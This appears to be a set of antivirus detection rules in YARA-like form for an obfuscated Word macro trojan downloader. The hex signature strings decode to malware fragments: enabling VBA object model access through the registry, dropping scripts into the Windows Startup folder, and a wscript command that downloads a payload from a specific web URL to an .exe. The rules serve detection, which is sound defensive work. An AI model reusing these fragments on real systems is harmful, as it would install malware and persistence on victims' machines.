
rule TrojanDownloader_O97M_Obfuse_PO_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.PO!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 01 00 "
		
	strings :
		$a_01_0 = {43 68 72 57 28 43 4c 6e 67 28 28 28 31 2e 35 35 35 35 35 35 35 35 35 35 35 35 35 36 20 2a 20 28 38 34 36 20 2d 20 37 36 35 23 29 } //01 00  ChrW(CLng(((1.55555555555556 * (846 - 765#)
		$a_01_1 = {77 64 44 69 61 6c 6f 67 54 6f 6f 6c 73 50 72 6f 74 65 63 74 44 6f 63 75 6d 65 6e 74 } //01 00  wdDialogToolsProtectDocument
		$a_01_2 = {77 64 55 6e 64 65 72 6c 69 6e 65 54 68 69 63 6b 20 58 6f 72 20 77 64 4b 65 79 4e 75 6d 65 72 69 63 44 69 76 69 64 65 } //01 00  wdUnderlineThick Xor wdKeyNumericDivide
		$a_01_3 = {2d 36 37 39 20 2b 20 36 37 39 2e 30 37 37 34 39 37 36 36 35 37 33 33 } //01 00  -679 + 679.077497665733
		$a_01_4 = {32 30 31 20 2b 20 77 64 53 74 79 6c 65 48 79 70 65 72 6c 69 6e 6b 46 6f 6c 6c 6f 77 65 64 } //01 00  201 + wdStyleHyperlinkFollowed
		$a_03_5 = {47 65 74 4f 62 6a 65 63 74 28 90 02 19 29 2e 53 70 61 77 6e 49 6e 73 74 61 6e 63 65 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_PO_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.PO!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_02_0 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 2e 52 65 67 57 72 69 74 65 20 90 02 15 24 20 26 20 22 41 63 63 65 73 73 56 42 4f 4d 22 2c 20 31 2c 20 22 52 45 47 5f 44 57 4f 52 44 22 90 00 } //01 00 
		$a_02_1 = {5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 53 74 61 72 74 20 4d 65 6e 75 5c 50 72 6f 67 72 61 6d 73 5c 53 74 61 72 74 75 70 5c 22 22 2b 22 20 2b 20 22 90 02 15 22 20 2b 20 22 2b 22 22 2e 65 78 65 22 90 00 } //01 00 
		$a_02_2 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 90 02 50 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 53 74 61 72 74 20 4d 65 6e 75 5c 50 72 6f 67 72 61 6d 73 5c 53 74 61 72 74 75 70 5c 74 65 6d 70 6c 61 74 65 73 2e 76 62 73 22 2c 20 54 72 75 65 2c 20 54 72 75 65 29 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_PO_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.PO!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {52 74 43 6f 6f 6c 4d 6f 6d 20 3d 20 52 74 43 6f 6f 6c 4d 6f 6d 20 2b 20 30 2e 30 30 30 30 30 30 30 30 31 30 35 20 2a 20 53 67 6e 28 31 2e 38 38 31 33 37 31 35 35 30 35 38 20 2b 20 31 37 32 34 30 32 2e 30 33 36 34 34 34 38 30 38 20 2a 20 41 73 73 69 74 65 6e 74 73 29 } //01 00  RtCoolMom = RtCoolMom + 0.00000000105 * Sgn(1.88137155058 + 172402.036444808 * Assitents)
		$a_01_1 = {57 72 69 74 65 4c 69 6e 65 20 28 22 77 73 63 72 69 70 74 20 2f 2f 6e 6f 6c 6f 67 6f 20 63 3a 5c 43 6f 6c 6f 72 66 6f 6e 74 73 33 32 5c 76 69 73 69 74 63 61 72 64 2e 76 62 73 20 68 74 74 70 73 3a 2f 2f 77 77 77 2e 6b 62 74 73 65 61 66 6f 6f 64 2e 63 6f 6d 2f 77 70 2d 63 6f 6e 74 65 6e 74 2f 75 70 6c 6f 61 64 73 2f 32 30 31 39 2f 30 37 2f 4a 54 47 55 4a 52 44 50 58 2e 72 65 73 20 63 3a 5c 43 6f 6c 6f 72 66 6f 6e 74 73 33 32 5c 70 65 73 31 39 2e 65 78 65 22 29 } //01 00  WriteLine ("wscript //nologo c:\Colorfonts32\visitcard.vbs https://www.kbtseafood.com/wp-content/uploads/2019/07/JTGUJRDPX.res c:\Colorfonts32\pes19.exe")
		$a_01_2 = {3d 20 4c 20 26 20 22 7c 22 20 26 20 42 20 26 20 22 7c 22 20 26 20 52 } //00 00  = L & "|" & B & "|" & R
	condition:
		any of ($a_*)
 
}